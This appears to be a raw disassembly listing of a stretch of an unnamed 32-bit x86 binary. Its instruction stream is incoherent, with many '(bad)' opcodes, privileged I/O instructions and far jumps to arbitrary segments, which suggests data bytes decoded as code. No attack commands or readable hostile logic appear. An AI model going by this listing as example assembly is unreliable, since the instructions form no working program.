  411983:	scas   al,BYTE PTR es:[edi]
  411984:	push   ss
  411985:	es push es
  411987:	cdq    
  411988:	sbb    BYTE PTR [eax+0x764d7387],al
  41198e:	and    DWORD PTR [edi-0x3d6224f0],esp
  411994:	or     al,0xb7
  411996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411997:	jae    0x411995
  411999:	xchg   edx,eax
  41199a:	xor    eax,esp
  41199c:	sub    DWORD PTR [eax],eax
  41199e:	push   0xc0283d52
  4119a3:	adc    eax,0x5af88298
  4119a8:	mov    al,ds:0x7c468c21
  4119ad:	mov    eax,0x2fa7505a
  4119b2:	sbb    ebx,DWORD PTR [si+0x3e]
  4119b6:	push   ebx
  4119b7:	jp     0x4119d2
  4119b9:	loope  0x411a02
  4119bb:	dec    ebp
  4119bc:	stos   BYTE PTR es:[edi],al
  4119bd:	xchg   edx,eax
  4119be:	push   cs
  4119bf:	xchg   DWORD PTR [ecx],edi
  4119c1:	bound  ecx,QWORD PTR [ebx+0x3d]
  4119c4:	arpl   WORD PTR [eax-0x46],bx
  4119c7:	ins    DWORD PTR es:[edi],dx
  4119c8:	lea    eax,[edi+0x14da63f8]
  4119ce:	mov    al,ds:0x1db90dcc
  4119d3:	popa   
  4119d4:	popf   
  4119d5:	lods   al,BYTE PTR ds:[esi]
  4119d6:	jnp    0x41198e
  4119d8:	popf   
  4119d9:	pop    ebp
  4119da:	push   esp
  4119db:	push   DWORD PTR [edx-0x4]
  4119de:	pop    eax
  4119df:	je     0x411a5d
  4119e1:	test   al,0x83
  4119e3:	inc    esi
  4119e4:	xor    edi,DWORD PTR [ebx+0x75d08b9f]
  4119ea:	pop    edx
  4119eb:	jecxz  0x4119bc
  4119ed:	or     DWORD PTR [eax+0x7d],esi
  4119f0:	inc    ebp
  4119f1:	mov    ch,0x9d
  4119f3:	(bad)  
  4119f4:	sbb    al,0xfd
  4119f6:	adc    al,bl
  4119f8:	daa    
  4119f9:	jae    0x4119e5
  4119fb:	jmp    0xebd22b37
  411a00:	ret    0x5d46
  411a03:	lods   al,BYTE PTR ds:[esi]
  411a04:	inc    edx
  411a05:	sub    eax,0xaa6f00bb
  411a0a:	scas   al,BYTE PTR es:[edi]
  411a0b:	mov    eax,ds:0xa673c8c3
  411a10:	lahf   
  411a11:	mov    eax,0xd9042892
  411a16:	push   ecx
  411a17:	xlat   BYTE PTR ds:[ebx]
  411a18:	arpl   bx,bx
  411a1a:	rol    DWORD PTR [ebx+ebp*4],1
  411a1d:	jb     0x411a54
  411a1f:	cmp    al,0x81
  411a21:	cmc    
  411a22:	sbb    BYTE PTR [ebx],bh
  411a24:	and    BYTE PTR [ecx],dl
  411a26:	leave  
  411a27:	pop    edx
  411a28:	sub    BYTE PTR [ecx-0x53620251],bl
  411a2e:	inc    ecx
  411a2f:	cdq    
  411a30:	push   esi
  411a31:	push   cs
  411a32:	xchg   edx,eax
  411a33:	mov    ch,0x3d
  411a35:	mov    ebp,0x4d0955fd
  411a3a:	iret   
  411a3b:	pop    edx
  411a3c:	cmp    esp,DWORD PTR [edx-0x4245f349]
  411a42:	ss mov ebp,0xe31c62d
  411a48:	aas    
  411a49:	mov    ebx,0x5b10857e
  411a4e:	xchg   edx,eax
  411a4f:	fnstcw WORD PTR [ecx+0x3a2e768b]
  411a55:	dec    esp
  411a56:	sub    DWORD PTR [edx],esp
  411a58:	outs   dx,BYTE PTR ds:[esi]
  411a59:	mov    ebx,0x6920a720
  411a5e:	pop    ecx
  411a5f:	jmp    0x1a8b3332
  411a64:	or     al,0x90
  411a66:	sbb    eax,DWORD PTR [edx*2-0x7429f8fc]
  411a6d:	adc    DWORD PTR [esi-0x52097a9d],edi
  411a73:	cdq    
  411a74:	aad    0x55
  411a76:	jnp    0x411aef
  411a78:	mov    ah,0x5
  411a7a:	imul   edi,DWORD PTR [eax+0x6950efe0],0x8c3a49b7
  411a84:	icebp  
  411a85:	and    al,dl
  411a87:	mov    fs,WORD PTR [esi-0x3c1839bc]
  411a8d:	xor    eax,0x74b845
  411a92:	out    dx,eax
  411a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a94:	in     al,dx
  411a95:	loope  0x411aec
  411a97:	loope  0x411a56
  411a99:	cli    
  411a9a:	pop    ecx
  411a9b:	(bad)  
  411a9c:	icebp  
  411a9d:	mov    ss,WORD PTR [ecx+0xd]
  411aa0:	test   eax,0x80bcff06
  411aa5:	cmp    al,0xec
  411aa7:	jmp    0x74a7:0xbd87b817
  411aae:	pop    ss
  411aaf:	inc    edx
  411ab0:	cmp    eax,0x132924f8
  411ab5:	fld    QWORD PTR [edi]
  411ab7:	mov    ds:0x5fde9497,eax
  411abc:	inc    ecx
  411abd:	and    DWORD PTR [edi-0x7],0xfffffffc
  411ac1:	mov    esi,0x81c15218
  411ac6:	pop    esi
  411ac7:	jp     0x411af9
  411ac9:	dec    ebx
  411aca:	jecxz  0x411a75
  411acc:	int3   
  411acd:	pop    es
  411ace:	int3   
  411acf:	push   edi
  411ad0:	sub    cl,BYTE PTR [edi-0x340267e5]
  411ad6:	cwde   
  411ad7:	xchg   edx,eax
  411ad8:	leave  
  411ad9:	pop    ebx
  411ada:	fs int 0xdb
  411add:	ror    BYTE PTR [eax-0x3f],1
  411ae0:	ins    BYTE PTR es:[edi],dx
  411ae1:	call   0x5acf:0xd6b5b90a
  411ae8:	or     edx,edx
  411aea:	cs push eax
  411aec:	jne    0x411b3a
  411aee:	sti    
  411aef:	inc    ebp
  411af0:	cmp    eax,0xe7d8d08f
  411af5:	clc    
  411af6:	inc    eax
  411af7:	scas   eax,DWORD PTR es:[edi]
  411af8:	xchg   edi,eax
  411af9:	pushf  
  411afa:	jecxz  0x411b2d
  411afc:	sbb    al,0xd6
  411afe:	pusha  
  411aff:	les    esi,FWORD PTR [edi+0x7]
  411b02:	push   cs
  411b03:	push   0x70
  411b05:	repz jmp 0x172e006e
  411b0b:	pop    esi
  411b0c:	mov    edi,0xf05e84a5
  411b11:	mov    ebx,ebp
  411b13:	xchg   BYTE PTR [eax],ch
  411b15:	push   ecx
  411b16:	xchg   esp,eax
  411b17:	repnz fwait
  411b19:	(bad)  
  411b1a:	jno    0x411af3
  411b1c:	das    
  411b1d:	cld    
  411b1e:	fist   WORD PTR [ecx]
  411b20:	sbb    ebx,ecx
  411b22:	or     edx,DWORD PTR [ebx-0x12c3fbc5]
  411b28:	jmp    0xab063a48
  411b2d:	addr16 (bad) 
  411b2f:	fist   WORD PTR [edx-0x1e]
  411b32:	push   eax
  411b33:	inc    esi
  411b34:	dec    ecx
  411b35:	sbb    eax,0x517c9806
  411b3a:	mov    ds:0xba56bf66,eax
  411b3f:	jbe    0x411afc
  411b41:	(bad)  
  411b42:	push   edx
  411b43:	nop
  411b44:	add    esp,DWORD PTR [edi]
  411b46:	call   0x5f3b:0x7c129f9
  411b4d:	mov    cl,0x97
  411b4f:	mov    ebx,0x501af609
  411b54:	sbb    dh,BYTE PTR [edi+ebp*1-0x56d93b92]
  411b5b:	pushf  
  411b5c:	cmc    
  411b5d:	inc    edx
  411b5e:	pop    ebx
  411b5f:	push   es
  411b60:	inc    esi
  411b61:	lods   eax,DWORD PTR ds:[esi]
  411b62:	mov    bh,0x7
  411b64:	imul   eax,DWORD PTR [edi+eiz*8-0x66],0x6e
  411b69:	inc    esi
  411b6a:	data16 sbb al,0x8
  411b6d:	in     eax,0xc9
  411b6f:	es icebp 
  411b71:	mov    esi,0x3af64910
  411b76:	dec    eax
  411b77:	icebp  
  411b78:	ret    
  411b79:	popf   
  411b7a:	scas   eax,DWORD PTR es:[edi]
  411b7b:	push   ebp
  411b7c:	add    al,0x3
  411b7e:	add    ch,al
  411b80:	mov    ch,0x2a
  411b82:	dec    esi
  411b83:	sbb    al,cl
  411b85:	ret    0x635e
  411b88:	sub    al,0x8a
  411b8a:	rol    DWORD PTR [esi+eiz*1-0x28cbee65],1
  411b91:	push   0xb1b3ebeb
  411b96:	pop    ds
  411b97:	iret   
  411b98:	popf   
  411b99:	lea    esi,[ebp+0x5e249489]
  411b9f:	inc    esi
  411ba0:	pop    esp
  411ba1:	add    dl,BYTE PTR [eax+0x66830530]
  411ba7:	jbe    0x411bcc
  411ba9:	gs fucom st(6)
  411bac:	(bad)  
  411bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bae:	jl     0x411bae
  411bb0:	ret    
  411bb1:	(bad)
  411bb5:	sbb    ch,BYTE PTR [esi]
  411bb7:	add    al,0x4a
  411bb9:	in     al,dx
  411bba:	jp     0x411b94
  411bbc:	gs push 0xffffff81
  411bbf:	rol    BYTE PTR [esi+0xe],1
  411bc2:	pop    ebp
  411bc3:	inc    ecx
  411bc4:	data16 jl 0x411bc6
  411bc7:	fst    st(3)
  411bc9:	fsubrp st(0),st
  411bcb:	xor    BYTE PTR [eax+0x7],bh
  411bce:	pop    ecx
  411bcf:	shl    DWORD PTR [ebx],1
  411bd1:	xor    al,0x40
  411bd3:	xor    eax,0x2bad6e7
  411bd8:	outs   dx,BYTE PTR ds:[esi]
  411bd9:	adc    DWORD PTR [ecx],eax
  411bdb:	sub    dl,BYTE PTR [ecx-0x545f7d2f]
  411be1:	stos   DWORD PTR es:[edi],eax
  411be2:	mov    ah,0xc5
  411be4:	loope  0x411c36
  411be6:	cli    
  411be7:	and    eax,ebp
  411be9:	imul   ecx,ebx,0xffffff8e
  411bec:	adc    esi,DWORD PTR [edx+0x4b]
  411bef:	rol    al,0x25
  411bf2:	loope  0x411c3a
  411bf4:	fwait
  411bf5:	ss inc esp
  411bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf8:	arpl   WORD PTR [ebx-0x499fad37],cx
  411bfe:	cmp    al,0x55
  411c00:	sbb    ecx,DWORD PTR [eax+0x46]
  411c03:	out    dx,eax
  411c04:	mov    eax,0xee5eda1c
  411c09:	and    BYTE PTR [eax-0xd7f29c6],0x6b
  411c10:	add    al,0x96
  411c12:	mov    cl,0x6f
  411c14:	out    dx,eax
  411c15:	cmp    eax,0xb148f527
  411c1a:	hlt    
  411c1b:	aas    
  411c1c:	iret   
  411c1d:	mov    BYTE PTR [edi+0x26],cl
  411c20:	repz mov al,0x3b
  411c23:	das    
  411c24:	inc    edi
  411c25:	paddq  mm6,QWORD PTR [edi+ecx*1]
  411c29:	xor    al,0x3c
  411c2b:	lds    edi,FWORD PTR [edi]
  411c2d:	jo     0x411c31
  411c2f:	(bad)  
  411c30:	bound  ebp,QWORD PTR [ecx+0x7]
  411c33:	xor    eax,0xe3aadc57
  411c38:	stos   BYTE PTR es:[edi],al
  411c39:	std    
  411c3a:	hlt    
  411c3b:	cmp    dh,dh
  411c3d:	fucomip st,st(6)
  411c3f:	cli    
  411c40:	lds    ecx,FWORD PTR [edx]
  411c42:	shr    DWORD PTR [ebp+0xb],0x62
  411c46:	int    0x1d
  411c48:	js     0x411c70
  411c4a:	out    0x9,eax
  411c4c:	add    al,0xbc
  411c4e:	or     BYTE PTR [ecx],0x3c
  411c51:	add    dl,dh
  411c53:	sbb    edi,DWORD PTR [edi+0x4306337d]
  411c59:	push   edi
  411c5a:	shr    DWORD PTR [esi+ebx*4+0x75],0x6b
  411c5f:	retf   0x370a
  411c62:	stos   BYTE PTR es:[edi],al
  411c63:	mov    ds:0xdb73b61f,al
  411c68:	cli    
  411c69:	or     al,0xfc
  411c6b:	clc    
  411c6c:	push   esp
  411c6e:	mov    BYTE PTR [edx+0x25],cl
  411c71:	cwde   
  411c72:	arpl   WORD PTR [edi+ecx*2-0x48],bx
  411c76:	icebp  
  411c77:	mov    BYTE PTR [edi+0x4],ch
  411c7a:	adc    al,0xe1
  411c7c:	lods   al,BYTE PTR ds:[esi]
  411c7d:	jge    0x411c28
  411c7f:	inc    ebp
  411c80:	mov    BYTE PTR [esp+ecx*1+0x76423c34],dl
  411c87:	adc    ecx,DWORD PTR [edx+0x4e]
  411c8a:	and    ebx,DWORD PTR ds:0x26afe182
  411c90:	sbb    al,0x43
  411c92:	test   eax,0xf6d5a885
  411c97:	std    
  411c98:	fld    QWORD PTR [ecx+edx*1-0xb]
  411c9c:	das    
  411c9d:	lods   al,BYTE PTR ds:[esi]
  411c9e:	shr    BYTE PTR [ebx],0xd6
  411ca1:	add    al,0x63
  411ca3:	inc    ecx
  411ca4:	mov    al,ds:0x5f2fb297
  411ca9:	popf   
  411caa:	cwde   
  411cab:	(bad)  [edi+0x10]
  411cae:	jo     0x411c36
  411cb0:	xor    al,0x17
  411cb2:	sbb    eax,DWORD PTR [esi-0x15]
  411cb5:	mov    DWORD PTR [esi+0x3d0b5f33],ebx
  411cbb:	cmc    
  411cbc:	xchg   esi,eax
  411cbd:	test   DWORD PTR [ecx-0x2],0x55488703
  411cc4:	add    eax,0x2ecad329
  411cc9:	push   0x19
  411ccb:	adc    DWORD PTR [ebx],ecx
  411ccd:	out    0x2e,al
  411ccf:	push   ecx
  411cd0:	imul   ebp,DWORD PTR [eax-0x98c325e],0x69
  411cd7:	aaa    
  411cd8:	sub    DWORD PTR [ebx],edx
  411cda:	add    BYTE PTR [edi+0x7cff356a],0xf7
  411ce1:	into   
  411ce2:	cwde   
  411ce3:	jno    0x411c6b
  411ce5:	cmp    DWORD PTR [esi+ebx*1],ebx
  411ce8:	sub    dl,al
  411cea:	es sbb bl,ah
  411ced:	and    BYTE PTR [esi+0x1956e7],bh
  411cf3:	cli    
  411cf4:	pop    esp
  411cf5:	jp     0x411cc8
  411cf7:	cwde   
  411cf8:	(bad)  
  411cf9:	(bad)  
  411cfa:	sbb    al,0x37
  411cfc:	arpl   WORD PTR [ebx],dx
  411cfe:	or     eax,0xb88c56a2
  411d03:	sub    al,0x1b
  411d05:	(bad)  
  411d06:	rcr    BYTE PTR ds:0x662e92b4,1
  411d0c:	in     al,dx
  411d0d:	xchg   WORD PTR [ebx],si
  411d10:	dec    ebx
  411d11:	shl    BYTE PTR [ebp+eiz*2-0x7ccfe9c3],cl
  411d18:	pop    esi
  411d19:	mov    ds:0xb3be3819,eax
  411d1e:	lods   eax,DWORD PTR ds:[esi]
  411d1f:	or     edx,edi
  411d21:	out    0x51,al
  411d23:	push   ebp
  411d24:	aas    
  411d25:	mov    esp,0x3c4d047f
  411d2a:	sub    DWORD PTR [esi-0x35],0x57
  411d2e:	xchg   edi,eax
  411d2f:	sub    al,0x7
  411d31:	and    al,bh
  411d33:	imul   ecx,DWORD PTR [edx],0xfffffffa
  411d36:	ret    0x9d8
  411d39:	sti    
  411d3a:	inc    ebp
  411d3b:	scas   al,BYTE PTR es:[edi]
  411d3c:	push   esp
  411d3d:	inc    edx
  411d3e:	push   ebp
  411d3f:	xlat   BYTE PTR ds:[ebx]
  411d40:	mov    bl,0xb0
  411d42:	in     eax,dx
  411d43:	int3   
  411d44:	call   0x2be7:0xe1fc9e70
  411d4b:	push   esp
  411d4c:	bound  ecx,QWORD PTR [bp+0x24]
  411d50:	retf   
  411d51:	pavgb  mm5,QWORD PTR [edi-0x63]
  411d55:	in     al,dx
  411d56:	(bad)  
  411d58:	ins    BYTE PTR es:[edi],dx
  411d59:	push   ebp
  411d5a:	jle    0x411cf4
  411d5c:	push   edx
  411d5d:	jl     0x411d6b
  411d5f:	and    dl,bh
  411d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d63:	jns    0x411dcd
  411d65:	cmp    DWORD PTR ds:0x56b7859f,esp
  411d6b:	mov    esp,0xa5293a14
  411d70:	fist   WORD PTR [eax+0x26e23636]
  411d76:	or     esi,DWORD PTR [eax+0x4]
  411d79:	ret    
  411d7a:	adc    DWORD PTR [ebx+ebp*2],ebp
  411d7d:	nop
  411d7e:	je     0x411db1
  411d80:	jne    0x411db5
  411d82:	jp     0x411db8
  411d84:	push   cs
  411d85:	dec    esi
  411d86:	and    al,0x32
  411d88:	pusha  
  411d89:	idiv   BYTE PTR [ecx+0x2b]
  411d8c:	xor    dh,al
  411d8e:	pop    edx
  411d8f:	outs   dx,BYTE PTR ds:[esi]
  411d90:	in     eax,0x89
  411d92:	mov    eax,esi
  411d94:	add    DWORD PTR [eax+0x581f350f],ebp
  411d9a:	xchg   ebp,eax
  411d9b:	inc    esi
  411d9c:	cmp    DWORD PTR [esi-0x1c6b931c],esp
  411da2:	fnstsw WORD PTR ds:0xab8e9df2
  411da8:	int3   
  411da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411daa:	jno    0x411d48
  411dac:	push   edx
  411dad:	jns    0x411df0
  411daf:	sub    dl,BYTE PTR [ecx+0x59]
  411db2:	es push eax
  411db4:	sti    
  411db5:	and    cl,ch
  411db7:	inc    edx
  411db8:	cmovge ebx,DWORD PTR [ebp-0x27]
  411dbc:	lods   eax,DWORD PTR ds:[esi]
  411dbd:	fdiv   QWORD PTR [ebx+0x3d]
  411dc0:	(bad)  
  411dc1:	sbb    eax,0xccbf51
  411dc6:	ror    ecx,1
  411dc8:	mov    dl,0x5e
  411dca:	sar    DWORD PTR [eax],0x57
  411dcd:	je     0x411e04
  411dcf:	jge    0x411de6
  411dd1:	icebp  
  411dd2:	adc    BYTE PTR ds:0x181886a1,bl
  411dd8:	retf   
  411dd9:	adc    edi,DWORD PTR [edi]
  411ddb:	jmp    0x8f1a:0x6412b933
  411de2:	and    dl,bh
  411de4:	xchg   esi,eax
  411de5:	cmp    dl,ch
  411de7:	aad    0xea
  411de9:	jp     0x411dd8
  411deb:	inc    eax
  411dec:	inc    BYTE PTR [ecx]
  411dee:	cmp    al,0x92
  411df0:	mov    BYTE PTR [edi+0x12],ah
  411df3:	push   0x6e
  411df5:	test   al,0x4f
  411df7:	sub    DWORD PTR [edi+0x193795e0],edi
  411dfd:	push   ds
  411dfe:	or     DWORD PTR [ebx-0x4e4cfe97],0x8779d4b5
  411e08:	cmp    eax,0x26d317e4
  411e0d:	pop    ebx
  411e0e:	test   DWORD PTR [edx],ebx
  411e10:	cdq    
  411e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e12:	ja     0x411e6d
  411e14:	fcomp  DWORD PTR [ecx+0x4e]
  411e17:	loope  0x411e3a
  411e19:	cli    
  411e1a:	xlat   BYTE PTR ds:[ebx]
  411e1b:	xchg   DWORD PTR [ecx+0x69],esi
  411e1e:	loop   0x411dc2
  411e20:	(bad)  
  411e21:	and    eax,DWORD PTR [ecx-0x4b]
  411e24:	sub    eax,0xc2345e8c
  411e29:	jl     0x411e3d
  411e2b:	test   al,0x2
  411e2d:	push   esi
  411e2e:	in     al,0xf5
  411e30:	retf   
  411e31:	push   ebx
  411e32:	test   eax,0x670fa40
  411e37:	jmp    0x411e1c
  411e39:	fcmovnu st,st(7)
  411e3b:	mov    cl,0x21
  411e3d:	jnp    0x411e23
  411e3f:	stc    
  411e40:	loopne 0x411e9a
  411e42:	xor    BYTE PTR ds:0x88cd73f1,cl
  411e48:	inc    ecx
  411e49:	jecxz  0x411e22
  411e4b:	push   ecx
  411e4c:	and    edi,esi
  411e4e:	scas   al,BYTE PTR es:[edi]
  411e4f:	rol    BYTE PTR [ecx],1
  411e51:	mov    esp,0x6c6b295b
  411e56:	cmp    al,0x44
  411e58:	and    al,BYTE PTR fs:[edx+0x5d]
  411e5c:	mov    ecx,0x49d1e050
  411e61:	cmp    DWORD PTR [ebx-0x38],ebx
  411e64:	popa   
  411e65:	cli    
  411e66:	mov    esi,0xb321bec1
  411e6b:	xor    edx,edi
  411e6d:	lods   eax,DWORD PTR ds:[esi]
  411e6e:	lods   eax,DWORD PTR ds:[esi]
  411e6f:	cmp    dh,ah
  411e71:	push   esp
  411e72:	pushf  
  411e73:	mov    ds:0x67098116,eax
  411e78:	dec    ecx
  411e79:	repz test BYTE PTR [esi],dh
  411e7c:	jmp    0x8b0c:0x5f66b4c9
  411e83:	lahf   
  411e84:	stos   BYTE PTR es:[edi],al
  411e85:	mov    dh,0xeb
  411e87:	or     eax,ecx
  411e89:	(bad)  [ebp+0x5f]
  411e8c:	mov    dl,0x16
  411e8e:	mov    ah,0xfa
  411e90:	sahf   
  411e91:	push   eax
  411e92:	mov    dl,BYTE PTR [esi+0x4ef5a0e9]
  411e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e99:	and    BYTE PTR [edx],dh
  411e9b:	arpl   di,sp
  411e9d:	cmp    ebp,DWORD PTR [eax-0x4edfcfd0]
  411ea3:	jg     0x411e38
  411ea5:	inc    ebp
  411ea6:	sbb    ebx,DWORD PTR [edi]
  411ea8:	out    0xe3,al
  411eaa:	cli    
  411eab:	fmul   DWORD PTR [edx+0x28cd7850]
  411eb1:	jae    0x411f20
  411eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb4:	(bad)  [ebp+ebp*2-0x77]
  411eb8:	stos   DWORD PTR es:[edi],eax
  411eb9:	aaa    
  411eba:	imul   ecx,DWORD PTR [edx],0x7d
  411ebd:	je     0x411ee9
  411ebf:	ds xchg esp,eax
  411ec1:	(bad)  [ebp-0x1ca43c75]
  411ec7:	ins    DWORD PTR es:[edi],dx
  411ec8:	sbb    DWORD PTR [ebx+0x17377150],ebp
  411ece:	xchg   ebx,eax
  411ecf:	add    al,0xb3
  411ed1:	xchg   BYTE PTR [ecx+0x4d],al
  411ed4:	lods   eax,DWORD PTR ds:[esi]
  411ed5:	push   esp
  411ed6:	fcomp  DWORD PTR [eax+edi*1+0x35]
  411eda:	and    DWORD PTR [ebx+0x78484e13],eax
  411ee0:	(bad)  
  411ee1:	fmul   QWORD PTR [eax+0xc26ad31]
  411ee7:	jle    0x411e74
  411ee9:	xchg   ecx,eax
  411eea:	sbb    ebx,DWORD PTR [edx+0x9]
  411eed:	push   esp
  411eee:	or     BYTE PTR [esi],bl
  411ef0:	cmp    BYTE PTR [ecx+0x74],ch
  411ef3:	test   DWORD PTR [edx],0x624f90a8
  411ef9:	sbb    esp,DWORD PTR [edi+0xf9b8bae]
  411eff:	shl    BYTE PTR [ebx+0x680d0c4d],1
  411f05:	dec    eax
  411f06:	jmp    0xfcdf:0xe7d03aa8
  411f0d:	scas   al,BYTE PTR es:[edi]
  411f0e:	and    BYTE PTR [ebp-0x3521cc60],bh
  411f14:	dec    ebx
  411f15:	mov    edx,0x75797d
  411f1a:	push   0x47
  411f1c:	cdq    
  411f1d:	pop    DWORD PTR [edi-0x6cb98c74]
  411f23:	jo     0x411eb3
  411f25:	and    eax,0x7a07f80b
  411f2a:	push   ds
  411f2b:	int3   
  411f2c:	neg    esi
  411f2e:	cdq    
  411f2f:	jmp    0xa4f0:0x6a1f0057
  411f36:	dec    esi
  411f37:	ror    DWORD PTR [edi+0x1f],cl
  411f3a:	lock or esp,ebp
  411f3d:	inc    edx
  411f3e:	rcr    BYTE PTR [esi+0x44],cl
  411f41:	outs   dx,BYTE PTR ds:[esi]
  411f42:	or     dl,BYTE PTR [eax]
  411f44:	jecxz  0x411f8e
  411f46:	adc    BYTE PTR [ecx-0x74],ch
  411f49:	out    0x30,eax
  411f4b:	push   es
  411f4c:	jle    0x411ee6
  411f4e:	sbb    eax,0xd5cbb0b7
  411f53:	or     BYTE PTR [esi],al
  411f55:	add    BYTE PTR [edi+0x47],cl
  411f58:	ficomp WORD PTR [ecx]
  411f5a:	sti    
  411f5b:	or     DWORD PTR [ebx+0x7a7ddf12],edx
  411f61:	push   ds
  411f62:	test   eax,0xf636a1a4
  411f67:	test   al,0x3a
  411f69:	leave  
  411f6a:	adc    DWORD PTR [ebp-0x28235542],edi
  411f70:	and    al,0x8c
  411f72:	mov    ebp,ecx
  411f74:	daa    
  411f75:	(bad)  
  411f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f77:	sub    ecx,eax
  411f79:	bound  edx,QWORD PTR [edi+edx*8+0x3f8ff26f]
  411f80:	fsub   DWORD PTR [eax+0x3a7a9329]
  411f86:	out    dx,al
  411f87:	mov    WORD PTR [ebx+eax*4+0x39ce88],fs
  411f8e:	cwde   
  411f8f:	scas   eax,DWORD PTR es:[edi]
  411f90:	or     eax,esp
  411f92:	dec    edx
  411f93:	pop    ebx
  411f94:	mov    fs,WORD PTR [edi-0x60]
  411f97:	mov    esi,DWORD PTR [bx+si]
  411f9a:	jae    0x411fe6
  411f9c:	clc    
  411f9d:	mov    edx,DWORD PTR [esi-0x3b99d992]
  411fa3:	(bad)  
  411fa4:	js     0x411f62
  411fa6:	jg     0x411fb3
  411fa8:	popa   
  411fa9:	js     0x411fc3
  411fab:	adc    esp,DWORD PTR [edx]
  411fad:	out    0x3d,eax
  411faf:	fstp   TBYTE PTR [edi+0x58be9470]
  411fb5:	cmp    BYTE PTR [ebx-0x42],ah
  411fb8:	scas   al,BYTE PTR es:[edi]
  411fb9:	inc    edx
  411fba:	and    eax,0x2cf2ed39
  411fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fc0:	test   esp,edi
  411fc2:	mov    ecx,0x3a57ef5
  411fc7:	mov    al,0xb3
  411fc9:	cmp    al,0x2f
  411fcb:	mov    es,WORD PTR [eax]
  411fcd:	adc    al,0xe3
  411fcf:	aam    0xf8
  411fd1:	(bad)  
  411fd2:	inc    esi
  411fd3:	lahf   
  411fd4:	push   0xb2c8c9ab
  411fd9:	inc    ebx
  411fda:	xchg   ebp,eax
  411fdb:	jl     0x411f74
  411fdd:	daa    
  411fde:	mov    dl,0x23
  411fe0:	scas   eax,DWORD PTR es:[edi]
  411fe1:	or     bh,BYTE PTR [ebp+esi*2+0x3533f0b]
  411fe8:	jne    0x411fee
  411fea:	and    al,0x6f
  411fec:	scas   eax,DWORD PTR es:[edi]
  411fed:	xchg   edx,eax
  411fee:	dec    DWORD PTR fs:0x3d64bf10
  411ff5:	mov    al,ds:0xecb84d2d
  411ffa:	push   edx
  411ffb:	aad    0x55
  411ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffe:	out    0xe,al
  412000:	pop    ebp
  412001:	cmp    BYTE PTR [eax-0x28],dl
  412004:	lahf   
  412005:	sub    DWORD PTR [esp+eiz*4],ecx
  412008:	mov    edx,DWORD PTR [eax+0x4d5f4632]
  41200e:	in     eax,dx
  41200f:	mov    dh,BYTE PTR [edi+0x12526c6]
  412015:	test   DWORD PTR [edi],0x1e861363
  41201b:	sti    
  41201c:	xchg   ch,dh
  41201e:	shl    DWORD PTR [edx-0x6f],cl
  412021:	ret    0x76d6
  412024:	loopne 0x412023
  412026:	sub    eax,0xa80c0e6f
  41202b:	ficom  WORD PTR [ecx]
  41202d:	mov    dh,0xce
  41202f:	mov    bl,0x45
  412031:	or     al,0xf4
  412033:	xor    bl,bh
  412035:	pusha  
  412036:	sub    bl,BYTE PTR [ebp+0x5f]
  412039:	js     0x411fe8
  41203b:	mov    al,0x49
  41203d:	leave  
  41203e:	aas    
  41203f:	ret    
  412040:	out    0x47,al
  412042:	gs xchg edx,eax
  412044:	cs in  al,dx
  412046:	les    esp,FWORD PTR [esi]
  412048:	pop    es
  412049:	out    0xd8,eax
  41204b:	sub    eax,0xdeebedd1
  412050:	inc    esi
  412051:	data16 jge 0x41202b
  412054:	sub    bh,BYTE PTR [ecx]
  412056:	xchg   ecx,ebx
  412058:	icebp  
  412059:	retf   0xaa09
  41205c:	push   0xffffffe3
  41205e:	sbb    DWORD PTR [ebx+0x78],eax
  412061:	les    ebp,FWORD PTR [ecx]
  412063:	jmp    0xbd8ec447
  412068:	inc    eax
  412069:	sti    
  41206a:	popf   
  41206b:	and    al,BYTE PTR [ecx+0x18fc1fea]
  412071:	and    BYTE PTR [ebx+0x41547b37],cl
  412077:	mov    dh,0xc6
  412079:	arpl   WORD PTR [esi+0x11565c4e],dx
  41207f:	inc    ebp
  412080:	jns    0x4120a3
  412082:	sub    DWORD PTR [ebp-0x666e4d9d],ebx
  412088:	sbb    BYTE PTR [ecx],0xf6
  41208b:	pop    es
  41208c:	repnz dec edi
  41208e:	sbb    esi,DWORD PTR [ebx]
  412090:	cwde   
  412091:	addr16 mov ecx,0xeb1688d3
  412097:	xchg   edx,eax
  412098:	xchg   ebx,eax
  412099:	add    edi,eax
  41209b:	cmp    eax,0x12debd2b
  4120a0:	adc    dl,0x78
  4120a3:	jns    0x412114
  4120a5:	out    dx,eax
  4120a6:	xchg   ebp,eax
  4120a7:	ret    
  4120a8:	dec    esi
  4120a9:	sbb    eax,0xc09965de
  4120ae:	lahf   
  4120af:	dec    esi
  4120b0:	(bad)  
  4120b1:	and    al,0x34
  4120b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120b4:	cwde   
  4120b5:	jmp    0xdea753f6
  4120ba:	lds    eax,FWORD PTR [edx-0x64]
  4120bd:	xor    al,0x30
  4120bf:	int    0x5a
  4120c1:	sbb    bl,ah
  4120c3:	out    0xf3,al
  4120c5:	das    
  4120c6:	test   dl,al
  4120c8:	popw   es
  4120ca:	mov    bl,0x3
  4120cc:	addr16 or eax,0xd4a75f36
  4120d2:	jae    0x41214d
  4120d4:	fistp  WORD PTR [ebx-0x9]
  4120d7:	rol    dh,0xdd
  4120da:	outs   dx,BYTE PTR ds:[esi]
  4120db:	ins    BYTE PTR es:[edi],dx
  4120dc:	xor    BYTE PTR [esp+ebp*8],ch
  4120df:	aam    0xad
  4120e1:	xchg   edi,eax
  4120e2:	and    al,0xf8
  4120e4:	shl    DWORD PTR [eax-0x2cb0da18],1
  4120ea:	imul   ebx,DWORD PTR [ecx-0x34bc5f08],0xffffff8e
  4120f1:	fmul   DWORD PTR [edx-0x6420c8c6]
  4120f7:	and    dl,BYTE PTR [edi]
  4120f9:	mov    dh,0x17
